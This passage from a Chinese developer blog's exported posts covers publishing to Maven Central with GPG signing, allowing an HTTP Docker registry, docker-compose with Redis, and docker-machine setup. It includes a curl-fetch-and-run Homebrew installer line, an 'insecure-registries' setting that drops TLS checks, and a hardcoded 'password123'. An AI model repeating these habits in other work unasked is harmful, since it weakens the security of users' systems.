<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cn.soilove has been prepared, now user(s) guolin can:</span><br><span class="line">    * Deploy snapshot artifacts into repository https:&#x2F;&#x2F;oss.sonatype.org&#x2F;content&#x2F;repositories&#x2F;snapshots</span><br><span class="line">    * Deploy release artifacts into the staging repository https:&#x2F;&#x2F;oss.sonatype.org&#x2F;service&#x2F;local&#x2F;staging&#x2F;deploy&#x2F;maven2</span><br><span class="line">    * Release staged artifacts into repository &#39;Releases&#39;</span><br><span class="line">please comment on this ticket when you promoted your first release, thanks  </span><br></pre></td></tr></table></figure>

<p>如果这个时候，你已经准备好deploy，那么就修改jira单的 Already Synced to Central为yes，表明你已经准备好同步到中央仓库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Already Synced to Central = yes </span><br></pre></td></tr></table></figure>
<p>4，最后，等你将项目打包好，推送到仓库后，再次到jira工单留言告知，开启同步。你也可以贴上打包发布成功的日志，留言示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">I have successfully closed and released.</span><br></pre></td></tr></table></figure>
<p>正常情况下，工作人员会回复如下内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Central sync is activated for cn.soilove. </span><br><span class="line">After you successfully release, your component will be published to Central, typically within 10 minutes, </span><br><span class="line">though updates to search.maven.org can take up to two hours.</span><br></pre></td></tr></table></figure>
<h3 id="工程pom和maven配置"><a href="#工程pom和maven配置" class="headerlink" title="工程pom和maven配置"></a>工程pom和maven配置</h3><p>1，修改maven settings.xml文件，新增server配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;server&gt;</span><br><span class="line">    &lt;id&gt;ossrh&lt;/id&gt;</span><br><span class="line">    &lt;username&gt;账号&lt;/username&gt;</span><br><span class="line">    &lt;password&gt;密码&lt;/password&gt;</span><br><span class="line">&lt;/server&gt;</span><br></pre></td></tr></table></figure>
<p>2，修改工程pom.xml文件，增加如下配置，根据实际工程情况修改：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;parent&gt;</span><br><span class="line">    &lt;groupId&gt;org.sonatype.oss&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;oss-parent&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;7&lt;/version&gt;</span><br><span class="line">&lt;/parent&gt;</span><br><span class="line">&lt;!-- 发布者信息 --&gt;</span><br><span class="line">&lt;developers&gt;</span><br><span class="line">    &lt;developer&gt;</span><br><span class="line">        &lt;name&gt;guolin&lt;/name&gt;</span><br><span class="line">        &lt;email&gt;root@soilove.cn&lt;/email&gt;</span><br><span class="line">        &lt;url&gt;https://blog.soilove.cn&lt;/url&gt;</span><br><span class="line">    &lt;/developer&gt;</span><br><span class="line">&lt;/developers&gt;</span><br><span class="line">&lt;!--scm信息--&gt;</span><br><span class="line">&lt;scm&gt;</span><br><span class="line">    &lt;url&gt;https://github.com/Ln-guolin/spring-boot-starter-oss&lt;/url&gt;</span><br><span class="line">&lt;/scm&gt;</span><br><span class="line">&lt;!--licenses信息 --&gt;</span><br><span class="line">&lt;licenses&gt;</span><br><span class="line">    &lt;license&gt;</span><br><span class="line">        &lt;name&gt;GNU General Public License v3.0&lt;/name&gt;</span><br><span class="line">        &lt;url&gt;http://www.gnu.org/licenses/agpl-3.0.html&lt;/url&gt;</span><br><span class="line">        &lt;distribution&gt;repo&lt;/distribution&gt;</span><br><span class="line">    &lt;/license&gt;</span><br><span class="line">&lt;/licenses&gt;</span><br><span class="line">&lt;!--打包配置 --&gt;</span><br><span class="line">&lt;build&gt;</span><br><span class="line">        &lt;plugins&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;groupId&gt;org.sonatype.plugins&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;nexus-staging-maven-plugin&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;1.6.3&lt;/version&gt;</span><br><span class="line">                &lt;extensions&gt;<span class="literal">true</span>&lt;/extensions&gt;</span><br><span class="line">                &lt;configuration&gt;</span><br><span class="line">                    &lt;serverId&gt;ossrh&lt;/serverId&gt;</span><br><span class="line">                    &lt;nexusUrl&gt;https://oss.sonatype.org/&lt;/nexusUrl&gt;</span><br><span class="line">                    &lt;autoReleaseAfterClose&gt;<span class="literal">true</span>&lt;/autoReleaseAfterClose&gt;</span><br><span class="line">                &lt;/configuration&gt;</span><br><span class="line">            &lt;/plugin&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;3.2&lt;/version&gt;</span><br><span class="line">                &lt;configuration&gt;</span><br><span class="line">                    &lt;<span class="built_in">source</span>&gt;1.8&lt;/<span class="built_in">source</span>&gt;</span><br><span class="line">                    &lt;target&gt;1.8&lt;/target&gt;</span><br><span class="line">                &lt;/configuration&gt;</span><br><span class="line">            &lt;/plugin&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;maven-gpg-plugin&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;1.6&lt;/version&gt;</span><br><span class="line">                &lt;executions&gt;</span><br><span class="line">                    &lt;execution&gt;</span><br><span class="line">                        &lt;id&gt;sign-artifacts&lt;/id&gt;</span><br><span class="line">                        &lt;phase&gt;verify&lt;/phase&gt;</span><br><span class="line">                        &lt;goals&gt;</span><br><span class="line">                            &lt;goal&gt;sign&lt;/goal&gt;</span><br><span class="line">                        &lt;/goals&gt;</span><br><span class="line">                    &lt;/execution&gt;</span><br><span class="line">                &lt;/executions&gt;</span><br><span class="line">            &lt;/plugin&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;maven-javadoc-plugin&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;2.10.3&lt;/version&gt;</span><br><span class="line">                &lt;executions&gt;</span><br><span class="line">                    &lt;execution&gt;</span><br><span class="line">                        &lt;id&gt;attach-javadocs&lt;/id&gt;</span><br><span class="line">                        &lt;goals&gt;</span><br><span class="line">                            &lt;goal&gt;jar&lt;/goal&gt;</span><br><span class="line">                        &lt;/goals&gt;</span><br><span class="line">                        &lt;configuration&gt; &lt;!-- add this to <span class="built_in">disable</span> checking --&gt;</span><br><span class="line">                            &lt;additionalparam&gt;-Xdoclint:none&lt;/additionalparam&gt;</span><br><span class="line">                        &lt;/configuration&gt;</span><br><span class="line">                    &lt;/execution&gt;</span><br><span class="line">                &lt;/executions&gt;</span><br><span class="line">            &lt;/plugin&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;maven-source-plugin&lt;/artifactId&gt;</span><br><span class="line">                &lt;executions&gt;</span><br><span class="line">                    &lt;execution&gt;</span><br><span class="line">                        &lt;id&gt;attach-sources&lt;/id&gt;</span><br><span class="line">                        &lt;goals&gt;</span><br><span class="line">                            &lt;goal&gt;jar-no-fork&lt;/goal&gt;</span><br><span class="line">                        &lt;/goals&gt;</span><br><span class="line">                    &lt;/execution&gt;</span><br><span class="line">                &lt;/executions&gt;</span><br><span class="line">            &lt;/plugin&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;</span><br><span class="line">            &lt;/plugin&gt;</span><br><span class="line">        &lt;/plugins&gt;</span><br><span class="line">    &lt;/build&gt;</span><br><span class="line">&lt;!--仓库配置 --&gt;</span><br><span class="line">&lt;distributionManagement&gt;</span><br><span class="line">    &lt;repository&gt;</span><br><span class="line">        &lt;id&gt;ossrh&lt;/id&gt;</span><br><span class="line">        &lt;name&gt;Maven Central Staging Repository&lt;/name&gt;</span><br><span class="line">        &lt;url&gt;https://oss.sonatype.org/service/<span class="built_in">local</span>/staging/deploy/maven2/&lt;/url&gt;</span><br><span class="line">    &lt;/repository&gt;</span><br><span class="line">    &lt;snapshotRepository&gt;</span><br><span class="line">        &lt;id&gt;ossrh&lt;/id&gt;</span><br><span class="line">        &lt;url&gt;https://oss.sonatype.org/content/repositories/snapshots&lt;/url&gt;</span><br><span class="line">    &lt;/snapshotRepository&gt;</span><br><span class="line">&lt;/distributionManagement&gt;</span><br></pre></td></tr></table></figure>
<h3 id="推送jar到中央仓库"><a href="#推送jar到中央仓库" class="headerlink" title="推送jar到中央仓库"></a>推送jar到中央仓库</h3><p>1，安装gpg，我这里是基于mac系统的，所以直接用brew安装了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew install gpg</span><br></pre></td></tr></table></figure>
<p>2，生成密钥对，会提示输入姓名、邮箱等字段，其它直接回车，直到输入密码界面，密码一定要输入记牢，后面打包会进行验证</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gpg --gen-key</span><br></pre></td></tr></table></figure>
<p>命令执行完成后，会输出公钥和私钥信息，一定要记录下来。万一忘记了可以“<code>gpg --list-keys</code>”提供公钥部分信息查询，输出如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gpg: &#x2F;Users&#x2F;chenguolin&#x2F;.gnupg&#x2F;trustdb.gpg：建立了信任度数据库</span><br><span class="line">gpg: 密钥 C49487317C8BXXXX 被标记为绝对信任</span><br><span class="line">gpg: 目录‘&#x2F;Users&#x2F;chenguolin&#x2F;.gnupg&#x2F;openpgp-revocs.d’已创建</span><br><span class="line">gpg: 吊销证书已被存储为‘&#x2F;Users&#x2F;chenguolin&#x2F;.gnupg&#x2F;openpgp-revocs.d&#x2F;E8C38745076F91ADEF800BADC49487317C8BXXXX.rev’</span><br><span class="line">公钥和私钥已经生成并被签名。</span><br><span class="line">pub   rsa2048 2020-04-14 [SC] [有效至：2022-04-14]</span><br><span class="line">      E8C38745076F91ADEF800BADC49487317C8BXXXX</span><br><span class="line">uid                      chenguolin &lt;root@soilove.cn&gt;</span><br><span class="line">sub   rsa2048 2020-04-14 [E] [有效至：2022-04-14]</span><br></pre></td></tr></table></figure>

<p>3，推送公钥(pub)到远程服务，并验证是否推送完成</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gpg --keyserver hkp://keyserver.ubuntu.com:80 --send-keys 公钥</span><br><span class="line">gpg --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys 公钥</span><br></pre></td></tr></table></figure>
<p>4，执行打包发布，注意！一定要在系统的命令窗口执行，idea的terminal中执行会报错，无法呼出密码输入窗口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> GPG_TTY=$(tty)</span><br><span class="line">mvn clean deploy</span><br></pre></td></tr></table></figure>
<p>打包成功，提示“BUILD SUCCESS”后，就完成了。</p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>我的工程和工单信息：<br>工单：<a href="https://issues.sonatype.org/browse/OSSRH-56616">OSSRH-56616</a><br>txt解析：ossrh-56616.soilove.cn<br>工程地址：<a href="https://github.com/Ln-guolin/spring-boot-starter-oss">spring-boot-starter-oss</a></p>
<p>相关站点，账号通用：<br>nexus仓库: <a href="https://oss.sonatype.org/#welcome">oss.sonatype.org</a><br>资源查询地址: <a href="http://search.maven.org/">search.maven.org</a></p>
]]></content>
      <categories>
        <category>maven</category>
      </categories>
      <tags>
        <tag>maven仓库</tag>
      </tags>
  </entry>
  <entry>
    <title>docker添加http仓库地址</title>
    <url>/2020/07/09/docker-add-http-addr/</url>
    <content><![CDATA[<h4 id="错误提示"><a href="#错误提示" class="headerlink" title="错误提示"></a>错误提示</h4><p>docker仓库访问地址默认都是https类型的，但我们搭建的私服都是http的，所以用docker访问仓库的时候就会抛出如下错误：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ERROR: Get https:&#x2F;&#x2F;soilove.cn:5000&#x2F;v2&#x2F;: http: server gave HTTP response to HTTPS client</span><br></pre></td></tr></table></figure>
<h4 id="解决方式"><a href="#解决方式" class="headerlink" title="解决方式"></a>解决方式</h4><p>进入/etc/docker目录，新建文件daemon.json，添加仓库地址，然后重启docker即可</p>
<p>配置如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://registry.docker-cn.com&quot;</span>,<span class="string">&quot;http://soilove.cn:5000&quot;</span>],</span><br><span class="line"> <span class="string">&quot;insecure-registries&quot;</span>: [<span class="string">&quot;https://registry.docker-cn.com&quot;</span>,<span class="string">&quot;http://soilove.cn:5000&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重启：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload </span><br><span class="line"></span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker仓库</tag>
      </tags>
  </entry>
  <entry>
    <title>docker三剑客之docker-compose</title>
    <url>/2018/09/16/docker-docker-compose/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>docker-compose是编排容器的利器，特别是涉及多个容器的运行时，不需要敲各个容器的启动参数，环境变量，容器命名，指定不同容器的链接参数等等一系列的操作，通过docker-compose，它可以轻松完成容器编排，并且提供了scale扩容功能。</p>
<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>在github官网上有提供安装的方式，直接下载二进制包进行安装即可。</p>
<p>下载地址：<a href="https://github.com/docker/compose/releases/">https://github.com/docker/compose/releases/</a> </p>
<p>安装命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo curl -L <span class="string">&quot;https://github.com/docker/compose/releases/download/1.27.4/docker-compose-<span class="subst">$(uname -s)</span>-<span class="subst">$(uname -m)</span>&quot;</span> -o /usr/<span class="built_in">local</span>/bin/docker-compose</span><br><span class="line"></span><br><span class="line">sudo chmod +x /usr/<span class="built_in">local</span>/bin/docker-compose</span><br></pre></td></tr></table></figure>
<p>然后，验证安装情况：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure>
<p>官网有介绍，如果你们mac或者windows用户，正常情况，你安装了docker客户端就默认安装了docker-compose。</p>
<h4 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h4><p>如果使用curl安装的，通过以下命令卸载Docker Compose ：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo rm /usr/<span class="built_in">local</span>/bin/docker-compose</span><br></pre></td></tr></table></figure>
<h4 id="实战练习"><a href="#实战练习" class="headerlink" title="实战练习"></a>实战练习</h4><h5 id="构建redis数据库"><a href="#构建redis数据库" class="headerlink" title="构建redis数据库"></a>构建redis数据库</h5><p>1，我们使用redis来做演示，首先，我们先看看命令行直接运行redis的方式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 6379:6379 --name some-redis -v &#x2F;my&#x2F;own&#x2F;redis&#x2F;data:&#x2F;data redis:3.2.9 redis-server --appendonly yes --requirepass &quot;password123&quot;</span><br></pre></td></tr></table></figure>
<p>2，然后，我们使用docker-compose来参考构建，我们创建一个docker-compose.yml文件，并添下面的内容：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">   <span class="attr">redis:</span></span><br><span class="line">     <span class="attr">image:</span> <span class="string">redis:3.2.9</span></span><br><span class="line">     <span class="attr">volumes:</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">data:/my/own/redis/data</span></span><br><span class="line">     <span class="attr">ports:</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">&quot;6379:6379&quot;</span></span><br><span class="line">     <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">     <span class="attr">command:</span>  <span class="string">redis-server</span> <span class="string">--appendonly</span> <span class="literal">yes</span> <span class="string">--requirepass</span> <span class="string">&quot;password123&quot;</span></span><br><span class="line"><span class="attr">volumes:</span></span><br><span class="line">  <span class="attr">data:</span></span><br></pre></td></tr></table></figure>
<p>3，执行构建</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<h5 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h5><p>下面列出几个时常会用到的docker-compose命令 </p>
<p><strong>config</strong> </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用法：docker-compose config </span><br><span class="line">解释：验证compose yml文件格式是否正确，若正确则显示配置，若格式错误显示错误原因 </span><br></pre></td></tr></table></figure>
<p><strong>ps</strong> </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用法： docker-compose ps [options] [SERVICE...] </span><br><span class="line">解释：列出项目中目前的所有容器。 选项： -q 只打印容器的 ID 信息 </span><br></pre></td></tr></table></figure>
<p><strong>images</strong> </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用法：docker-compose images </span><br><span class="line">解释：列出项目中的所有容器镜像 </span><br></pre></td></tr></table></figure>
<p><strong>up</strong> </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用法：docker-compose up [options] [SERVICE...] </span><br><span class="line">解释：通常使用“docker-compose up -d”自动完成包括构建镜像，（重新）创建服务，启动服务，并关联服务相关容器的一系列操作，在后台运行。 </span><br><span class="line">如果服务容器已经存在，up 将会尝试停止容器，然后重新创建，以保证新启动的服务匹配 docker-compose.yml文件的最新内容。 </span><br><span class="line">如果用户不希望容器被停止并重新创建，可以添加“--no-recreate”指令，将只会启动处于停止状态的容器，而忽略已经运行的服务。 </span><br><span class="line">如果用户只想重新部署某个服务，可以使用 docker-compose up --no-deps -d &lt;SERVICE_NAME&gt; 来重新创建服务并后台停止旧服务，启动新服务，并不会影响到其所依赖的服务。 </span><br><span class="line">选项： </span><br><span class="line">  -d 在后台运行服务容器 </span><br><span class="line">  --no-color 不使用颜色来区分不同的服务的控制台输出 </span><br><span class="line">  --no-deps 不启动服务所链接的容器 </span><br><span class="line">  --force-recreate 强制重新创建容器，不能与 --no-recreate 同时使用 </span><br><span class="line">  --no-recreate 如果容器已经存在了，则不重新创建，不能与 --force-recreate 同时使用 </span><br><span class="line">  --no-build 不自动构建缺失的服务镜像 </span><br><span class="line">  -t, --timeout TIMEOUT 停止容器时候的超时（默认为 10 秒） </span><br></pre></td></tr></table></figure>
<p><strong>start</strong> </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用法：docker-compose start [SERVICE...] </span><br><span class="line">解释：启动已经存在的服务容器。 </span><br></pre></td></tr></table></figure>
<p><strong>stop</strong> </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用法： docker-compose stop [options] [SERVICE...] </span><br><span class="line">解释：停止已经处于运行状态的容器，但不删除它 选项： -t, --timeout TIMEOUT 停止容器时候的超时（默认为 10 秒 ）</span><br></pre></td></tr></table></figure>
<p><strong>restart</strong> </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用法：docker-compose restart [options] [SERVICE...] </span><br><span class="line">解释：重启项目中的服务 </span><br></pre></td></tr></table></figure>
<p><strong>rm</strong> </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用法：docker-compose rm [options] [SERVICE...] </span><br><span class="line">解释：删除所有（停止状态的）服务容器，推荐先执行 docker-compose stop 命令来停止容器。 </span><br><span class="line">选项： -f, --force 强制直接删除，包括非停止状态的容器。尽量不要使用该选项 -v 删除容器所挂载的数据卷 </span><br></pre></td></tr></table></figure>
<p><strong>logs</strong> </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用法：docker-compose logs [options] [SERVICE...] </span><br><span class="line">解释：查看服务容器的输出。默认情况下，docker-compose 将对不同的服务输出使用不同的颜色来区分,可以通过 --no-color 来关闭颜色。 </span><br></pre></td></tr></table></figure>
<p><strong>scale</strong> </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用法：docker-compose scale [options] [SERVICE&#x3D;NUM...] </span><br><span class="line">解释：设置指定服务运行的容器个数，一般在需要进行扩容的时候用到，通过 service&#x3D;num 的参数来设置数量。</span><br><span class="line">例如： docker-compose scale mysql&#x3D;3 redis&#x3D;2 将启动3个容器运行mysql服务，2个容器运行redis服务。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker-compose</tag>
        <tag>docker三剑客</tag>
      </tags>
  </entry>
  <entry>
    <title>docker三剑客之docker-machine</title>
    <url>/2018/09/16/docker-docker-machine/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>你可以用docker machine来做什么？<br>1，在mac和windows平台上安装和运行docker<br>2，提供和管理多个远程docker主机<br>3，提供swarm集群管理 </p>
<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>安装很简单，直接从github下载编译好的二进制文件即可，也可以参考<a href="https://docs.docker.com/machine/overview/">官网详细介绍</a><br>下载地址：<a href="https://github.com/docker/machine/releases">https://github.com/docker/machine/releases</a> </p>
<h5 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -L https://github.com/docker/machine/releases/download/v0.16.2/docker-machine-`uname -s`-`uname -m` &gt;/tmp/docker-machine &amp;&amp;</span><br><span class="line">chmod +x /tmp/docker-machine &amp;&amp;</span><br><span class="line">sudo cp /tmp/docker-machine /usr/<span class="built_in">local</span>/bin/docker-machine</span><br></pre></td></tr></table></figure>
<h5 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h5><p>mac客户端已经包含了machine，其实无需单独安装。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -L https://github.com/docker/machine/releases/download/v0.16.2/docker-machine-`uname -s`-`uname -m` &gt;/usr/<span class="built_in">local</span>/bin/docker-machine &amp;&amp; </span><br><span class="line">chmod +x /usr/<span class="built_in">local</span>/bin/docker-machine</span><br></pre></td></tr></table></figure>
<p>查看machine安装版本，可以正常输出版本信息即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-machine -v</span><br></pre></td></tr></table></figure>
<p> </p>
<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><h5 id="1，创建主机"><a href="#1，创建主机" class="headerlink" title="1，创建主机"></a>1，创建主机</h5><p>1，创建主机节点，不同的服务器，可能支持的驱动不同，所以要按需处理 </p>
<h6 id="Centos"><a href="#Centos" class="headerlink" title="Centos"></a>Centos</h6><p>直接选择virtualbox类型的驱动来创建主机：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-machine create -d virtualbox <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<h6 id="ECS-Centos"><a href="#ECS-Centos" class="headerlink" title="ECS-Centos"></a>ECS-Centos</h6><p>需要使用阿里云提供的驱动ECS Driver来创建， 参见：<a href="https://develop.aliyun.com/command/docker">驱动下载和安装文档</a> </p>
<p>安装驱动：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir docker-machine</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> docker-machine</span><br><span class="line"></span><br><span class="line">wget https://docker-machine-drivers.oss-cn-beijing.aliyuncs.com/docker-machine-driver-aliyunecs_linux-amd64.tgz</span><br><span class="line"></span><br><span class="line">mv docker-machine-driver-aliyunecs_linux-amd64.tgz driver-aliyunecs.tgz</span><br><span class="line"></span><br><span class="line">tar -zxvf driver-aliyunecs.tgz</span><br><span class="line"></span><br><span class="line">cp bin/docker-machine-driver-aliyunecs.linux-amd64 /usr/<span class="built_in">local</span>/bin/docker-machine-driver-aliyunecs</span><br></pre></td></tr></table></figure>
<p>使用阿里云驱动aliyunecs，创建创建主机时，<strong>aliyunecs-access-key-id</strong> 和 <strong>aliyunecs-access-key-secret</strong> 是必填参数，可以直接在aliyunecs后追加，也可以设置到环境变量当中。</p>
<p>设置环境变量：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> ECS_ACCESS_KEY_ID=<span class="string">&#x27;&lt;Your access key ID&gt;&#x27;</span></span><br><span class="line"><span class="built_in">export</span> ECS_ACCESS_KEY_SECRET=<span class="string">&#x27;&lt;Your secret access key&gt;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>创建主机：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-machine create -d aliyunecs testali</span><br></pre></td></tr></table></figure>
<p>命令参数参考： <a href="https://github.com/AliyunContainerService/docker-machine-driver-aliyunecs">点我查看命令详细介绍</a>   </p>
<h6 id="Mac-1"><a href="#Mac-1" class="headerlink" title="Mac"></a>Mac</h6><p>使用xhyve驱动，初次使用得先安装：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew install docker-machine-driver-xhyve</span><br><span class="line"></span><br><span class="line">sudo chown root:wheel $(brew --prefix)/opt/docker-machine-driver-xhyve/bin/docker-machine-driver-xhyve</span><br><span class="line"></span><br><span class="line">sudo chmod u+s $(brew --prefix)/opt/docker-machine-driver-xhyve/bin/docker-machine-driver-xhyve</span><br></pre></td></tr></table></figure>
<p>如果mac上没有装brew工具，可以通过下面的命令安装brew：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ruby -e <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)</span>&quot;</span></span><br></pre></td></tr></table></figure>
<p>常用参数(更多命令查看:“docker-machine create -d xhyve -help”)：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">配置docker主机镜像文件地址：--xhyve-boot2docker-url ~&#x2F;.docker&#x2F;machine&#x2F;cache&#x2F;boot2docker.iso</span><br><span class="line">配置Docker的仓库镜像：--engine-registry-mirror https:&#x2F;&#x2F;registry.docker-cn.com</span><br><span class="line">配置主机内存：--virtualbox-memory 2048</span><br><span class="line">配置主机CPU：--virtualbox-cpu-count 2</span><br></pre></td></tr></table></figure>
<p>创建主机：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-machine create -d xhyve --xhyve-boot2docker-url ~/.docker/machine/cache/boot2docker.iso --engine-registry-mirror https://registry.docker-cn.com <span class="built_in">test</span></span><br></pre></td></tr></table></figure>

<h5 id="2，查询主机"><a href="#2，查询主机" class="headerlink" title="2，查询主机"></a>2，查询主机</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-machine ls</span><br></pre></td></tr></table></figure>
<p>输出如下即可： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NAME ACTIVE DRIVER STATE URL SWARM DOCKER ERRORS</span><br><span class="line">test - xhyve Running tcp:&#x2F;&#x2F;192.168.64.2:2376 v18.06.1-ce</span><br></pre></td></tr></table></figure>

<h5 id="3，连接主机"><a href="#3，连接主机" class="headerlink" title="3，连接主机"></a>3，连接主机</h5><p>尝试登录ssh连接到docker-machine主机：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-machine ssh <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<p>a，查看主机的docker版本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker -v</span><br></pre></td></tr></table></figure>
<p>b，尝试运行容器，以portainer为例</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -p 9000:9000 --restart always -v /var/run/docker.sock:/var/run/docker.sock -v /opt/portainer:/data portainer/portainer</span><br></pre></td></tr></table></figure>
<p>c，先使用命令：<strong>exit</strong> 退出主机，然后查看IP，并尝试在主机浏览器上访问启动的portainer容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-machine ip <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<p>浏览器访问：<a href="http://ip:9000/">http://ip:9000</a> ，能正常访问即可！  </p>
<h4 id="报错处理"><a href="#报错处理" class="headerlink" title="报错处理"></a>报错处理</h4><p>做什么事情不遇到些错误是不可能的，这次是踩了不少坑，记录下来，方便下次审阅。 </p>
<p><strong>错误1:</strong> </p>
<p>我是在阿里云ECS上使用的时候提示的错误： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_VBoxManage not found. Make sure VirtualBox is installed and VBoxManage is in the path_ </span><br></pre></td></tr></table></figure>
<p>解决办法：<br>配置安装源，安装VirtualBox</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/yum.repos.d/virtualbox.repo</span><br></pre></td></tr></table></figure>
<p>内容如下：</p>
